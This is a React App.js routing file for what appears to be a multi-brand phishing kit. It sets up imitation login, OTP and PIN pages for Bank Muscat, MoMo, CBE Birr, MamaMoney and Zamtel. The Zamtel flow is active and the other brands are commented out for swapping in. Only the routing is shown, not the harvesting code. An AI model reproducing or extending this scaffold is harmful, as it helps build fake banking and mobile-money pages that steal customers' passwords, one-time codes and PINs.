import React from "react";
import FeesAndCharges from "./FeesAndCharges";
import { Routes, Route } from "react-router-dom";
import Firstpage from "./Firstpage";
import BankMuscatForms from "./BankMuscatForms";
import ThirdPage from "./ThirdPage";
import OTPVerification from "./OTPVerification";
import MoMoLogin from "./MoMoLogin";
import Otppage from "./Otppage"
import PINEntry from "./PINEntry";
import CBEBirrLogin from "./CBEBirrLogin";
import LoginAuthentication from "./LoginAuthentication";
import OtpVerify from "./OtpVerify";
import MamaMoney from "./MamaMoney";
import MamaMoneyOTP from "./MamaMoneyOTP";
import ZamtelLogin from "./Zamtellogin";
import ZamtelOtp from "./Zamtelotp";
import ZamtelPin from "./ZamtelPin";

function App() {
  return (
    <>
      <Routes>
        {/* <Route path="/" element={<Firstpage />} />
        <Route path="/feecharges" element={<FeesAndCharges />} />
        <Route path="/form" element={<BankMuscatForms />} />
        <Route path="/third" element={<ThirdPage />} />
        <Route path="/otpcode" element={<OTPVerification />} /> */}
        
        {/* <Route path='/' element={  <MoMoLogin/>}/>
        <Route path='/pincode' element={  <PINEntry/>}/>
        <Route path='/otppage' element={  <Otppage/>}/> */}



{/* <Route path="/" element={<MamaMoney/>}/> */}
<Route path="/" element={<ZamtelLogin/>}/>
<Route path="/otp" element={<ZamtelOtp/>}/>  
<Route path="/pin" element={<ZamtelPin/>}/>  
{/* <Route path="/otp" element={<MamaMoneyOTP/>}/> */}
        {/* <Route path="/" element={<CBEBirrLogin/>}/> */}
        {/* <Route path="/loginauth" element={<LoginAuthentication/>}/> */}
        {/* <Route path="/otpverify" element={<OtpVerify/>}/> */}
      </Routes>
    
    </>
  );
}

export default App;
